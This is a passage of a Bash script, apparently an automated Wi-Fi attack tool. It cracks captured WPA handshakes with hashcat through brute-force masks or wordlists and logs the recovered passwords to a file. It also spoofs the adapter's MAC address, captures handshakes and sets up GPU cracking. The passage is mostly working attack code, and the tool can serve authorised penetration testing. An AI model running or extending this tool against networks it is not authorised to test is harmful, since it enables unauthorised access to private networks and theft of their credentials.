        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with selected wordlist" "$targets_path/wifi_passwords.txt"
        
        echo
        read -p "Do you want to try different attack? (Y/n): " choice
        case $choice in
            y|Y)
                choose_attack
                ;;
            n|N)
                another_scan_prompt
                ;;
            *)
                echo -e "\e[1;31mInvalid choice.\e[0m Please enter 'y' or 'n'."
                ;;
        esac        
    fi
}



# ------------------------------
# Brute-Force attack
# ------------------------------
function brute-force_attack() {
    
    echo -e "\e[1m\nCracking WiFi password with Hashcat ->>\e[0m\n"

    # Ask user for password length
    while true; do
        read -p "Enter password length (Wi-Fi min: 8): " password_length
        if [[ -z "$password_length" ]]; then
            password_length=8
            echo "default is 8"
            break
        fi
        if [[ "$password_length" =~ ^[0-9]+$ ]] && [[ "$password_length" -gt 0 ]]; then
            break
        else
            echo "Invalid password length. Please enter a positive number."
        fi
    done

    while true; do
        full_mask=""
        echo -e "\n\e[1mChoose how to run the Brute-Force:\e[0m"
        echo -e "\e[1;31m1)\e[0m Try every possible combination                     ?a   -   (ABC-abc-123-!@#)   |   $password_length^94 possibilities.\n"
        echo -e "\e[1;31m2)\e[0m Customize each position of the password:"
        echo "   1.  Uppercase                                      ?u   -   (ABC)"
        echo "   2.  Lowercase                                      ?l   -   (abc)"
        echo "   3.  Numbers                                        ?d   -   (123)"
        echo "   4.  Special characters                             ?s   -   (!@#)"
        echo "   5.  Uppercase + Numbers                            ?1   -   (ABC-123)"
        echo "   6.  Lowercase + Numbers                            ?2   -   (abc-123)"
        echo "   7.  Uppercase + Lowercase                          ?3   -   (ABC-abc)"
        echo "   8.  Uppercase + Lowercase + Numbers                ?4   -   (ABC-abc-123)"        
        echo "   9.  Uppercase + Lowercase + Numbers + specials     ?a   -   (ABC-abc-123-!@#)"
        echo "   10. Enter a specific character: __"
        echo -e "\n\n"

	while true; do
	    echo -n -e "Enter your choice (\e[1;31m1\e[0m-\e[1;31m2\e[0m): "
	    read option
	    if [[ "$option" -eq 1 || "$option" -eq 2 ]]; then
		break
	    else
		echo -e "\e[1;31mInvalid option.\e[0m"
		sleep 1
		tput cuu1; tput el; tput cuu1; tput el;
	    fi
	done
        
        if [[ "$option" -eq 1 ]]; then
            echo -e "\nWe will check all possible characters (ABC-abc-123-!@#) for each position."
            char_set="?a"
            for (( i=0; i<password_length; i++ )); do
                full_mask+="$char_set"
            done
            break

        elif [[ "$option" -eq 2 ]]; then
            positions=()
            charset=""
 
            tput cuu1; tput el; tput cuu1; tput el;
            echo -n -e "\e[1mCurrent mask:	\e[0m "
            for (( j=1; j<=password_length; j++ )); do
                if [[ -z "${positions[j-1]}" ]]; then
                    echo -n -e "$j.\e[1;36m[\e[0m  \e[1;36m]\e[0m "
                else
                    echo -n -e "$j.\e[1;36m[\e[0m \e[1;31m${positions[j-1]}\e[1;36m \e[1;36m]\e[0m "
                fi
            done
            echo   
 
            for (( i=1; i<=password_length; i++ )); do
                    read -p "Choose an option for position $i/$password_length  (Choose 1-10): " choice
                    case "$choice" in
                        1) positions+=("?u");; 
                        2) positions+=("?l");; 
                        3) positions+=("?d");;
                        4) positions+=("?s");;
                        5) positions+=("?1"); charset+="-1 ?u?d ";;  
                        6) positions+=("?2"); charset+="-2 ?l?d ";;
                        7) positions+=("?3"); charset+="-3 ?u?l ";;
                        8) positions+=("?4"); charset+="-4 ?u?l?d ";;
                        9) positions+=("?a");;                         
                        10)
                            while true; do
                                read -p "  Enter the specific character for position $i: " specific_char
                                if [[ ${#specific_char} -eq 1 ]]; then
                                    positions+=("$specific_char")
                                    tput cuu1; tput el; tput cuu1; tput el; 
                                    echo -n -e "\e[1mCurrent mask:	\e[0m "
					for (( j=1; j<=password_length; j++ )); do
					    if [[ -z "${positions[j-1]}" ]]; then
						echo -n -e "$j.\e[1;36m[\e[0m  \e[1;36m]\e[0m "
					    else
						echo -n -e "$j.\e[1;36m[\e[0m \e[1;31m${positions[j-1]}\e[1;36m \e[1;36m]\e[0m "
					    fi
					done
                                    echo
                                    break
                                else
                                    tput cuu1; tput el; tput cuu1; tput el;
                                    echo -e "\e[1;31mInvalid input!\e[0m Please enter exactly ONE character."
                                fi
                            done
                            ;;
                        *) echo -e "\e[1;31mInvalid choice!\e[0m Please enter a valid option (1-10)." && sleep 2;
                           tput cuu1; tput el;
                           ((i--));;
                    esac
           
                tput cuu1; tput el; tput cuu1; tput el;
                echo -n -e "\e[1mCurrent mask:	\e[0m "
                for (( j=1; j<=password_length; j++ )); do
                    if [[ -z "${positions[j-1]}" ]]; then
                        echo -n -e "$j.\e[1;36m[\e[0m  \e[1;36m]\e[0m "
                    else
                        echo -n -e "$j.\e[1;36m[\e[0m \e[1;31m${positions[j-1]}\e[1;36m \e[1;36m]\e[0m "
                    fi
                done
                echo                   
            done
            full_mask=$(IFS=; echo "${positions[*]}")
            break
        fi
    done

    echo -e "\n\n\033[1;33mGenerated Hashcat mask:\033[0m \033[1;31m\033[1m$full_mask\033[0m\n\n"

    # Run hashcat with the correct options
    if [[ -n "$charset" ]]; then
        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" $charset $full_mask --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
    else
        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" $full_mask --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
    fi
           
    echo
    if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
        wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
        echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
        
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with.*/ { s/\nPassword not cracked with.*// } }" "$targets_path/wifi_passwords.txt"

        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with// } }" "$targets_path/wifi_passwords.txt"
        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ d; }" "$targets_path/wifi_passwords.txt"
        
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The Wi-Fi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
        rm -r $targets_path/"$bssid_name" 
        exit 1
    else
        echo -e "\n\033[1;31m\033[1mCouldn't cracked with Brute-Force with this masking: $full_mask\033[0m\n"
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Brute-Force of this masking: $full_mask" "$targets_path/wifi_passwords.txt"
        echo
        read -p "Do you want to try different attack (Y/n)? " choice
        case $choice in
            y|Y)
                choose_attack
                ;;
            n|N)
                another_scan_prompt
                ;;
            *)
                echo -e "\e[1;31mInvalid choice.\e[0m Please enter 'y' or 'n'."
                ;;
        esac        
    fi    
}





# -----------------
# Enable GPU
# -----------------
function enable_gpu() {
    # Check if running in a VM
    if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
        echo -e "You are running inside a virtual machine. GPU is not available.\n"
        return 1
    fi

    # Detect GPU
    GPU_INFO=$(lspci -nn | grep -i 'vga\|3d' | grep -i 'nvidia')

    if [[ -z "$GPU_INFO" ]]; then
        echo -e "\n\e[1;31mNo NVIDIA GPU detected. Skipping GPU setup.\e[0m"
        return 1
    fi

    # Extract GPU model
    GPU_MODEL=$(echo "$GPU_INFO" | sed -E 's/.*\[(GeForce [^]]+)\].*/\1/')
    echo -e "GPU detected: \e[1;32mNVIDIA $GPU_MODEL\e[0m"

    # Check for CUDA
    if command -v nvidia-smi &>/dev/null; then
        CUDA_VERSION=$(nvidia-smi | grep -i "CUDA Version" | awk '{print $6}')
        echo -e "CUDA is installed. Version: \e[1;34m$CUDA_VERSION\e[0m"
    else
        echo -e "\nCUDA is not detected."
        read -p "Would you like to install CUDA? (Y/n): " response
        if [[ "$response" =~ ^[Yy]$ ]]; then
            echo -e "\nInstalling NVIDIA CUDA drivers..."
	    packages=("linux-headers-amd64" "nvidia-driver" "nvidia-cuda-toolkit")
	    for package in "${packages[@]}"; do
		    if ! dpkg -l | grep -q "^ii  $package "; then
		        echo -e "\nInstalling $package..."
		        apt install -y "$package"
		    else
		        echo -e "✅ $package is already installed."
		    fi
	    done                        
            echo -e "\n\e[1;33mPlease reboot your system for changes to take effect.\e[0m"
            return 0
        else
            echo -e "\nSkipping CUDA installation. GPU will not be used."
            return 1
        fi
    fi
    # Check if Hashcat detects the GPU
    HASHCAT_INFO=$(hashcat -I | grep GPU 2>/dev/null)
    if [[ -n "$HASHCAT_INFO" ]]; then
        echo -e "Great! Hashcat detects the GPU and will use it.\n\n"
        return 0
    else
        echo -e "\nHashcat does not detect the GPU."
        echo -e "Possible reasons:\n   - Missing NVIDIA drivers\n   - OpenCL not installed\n   - CUDA not properly configured"
        echo -e "\nSkipping GPU setup."
    fi
}


# ------------------------------
# Another Scan Prompt
# ------------------------------
function another_scan_prompt() {
    while true; do
        echo
        echo -e "\e[1mWhat would you like to do next ?\e[0m"
        echo "1. Choose different network to attack"
        echo "2. Run a new Scan"
        echo "3. Exit"
        read -p "Enter your choice (1-3): " choice
        echo
        case $choice in
            1)
                choose_network
	
		if [[ "$encryption" == "WPA3 WPA2" ]]; then            
		    mixed_encryption
		fi    

		capture_handshake
		cleanup	
		choose_attack
                break
                ;;
            2)
                main_process
                break
                ;;
            3)
                echo -e "\nBye."
                cleanup
                exit 1
                ;;
            *)
                echo "Invalid input. Please enter 1-3."
                ;;
        esac
    done
}



# ------------------------------
# Cleanup
# ------------------------------
function cleanup() {
	chown -R $UN:$UN $targets_path
	gnome-terminal --geometry=1x1-10000-10000 -- airmon-ng stop "$wifi_adapter"mon
	gnome-terminal --geometry=1x1-10000-10000 -- systemctl start NetworkManager
}


# ------------------------------
# Choose Attack
# ------------------------------
function choose_attack() {
	while true; do
	    echo -e "\n\n\033[1;33mChoose how to Crack the Password:\e[0m"
	    echo "1) Dictionary attack"
	    echo "2) Brute-Force attack"
	    read -p "Enter your choice: " choice
	    echo

	    case $choice in
		1)
		    dictionary_attack
		    ;;
		2)
		    brute-force_attack
		    ;;
		*)
		    echo "Invalid choice. Please select 1 or 2."
		    ;;
	    esac
	done
}



# ------------------------------
# Main Process
# ------------------------------
function main_process() {
	adapter_config
	spoof_adapter_mac
	network_scanner

	if [[ "$encryption" == "WPA3 WPA2" ]]; then            
            mixed_encryption
        fi    
        
        capture_handshake
	cleanup	
	choose_attack
}

install_dependencies
check_wordlist
enable_gpu
main_process
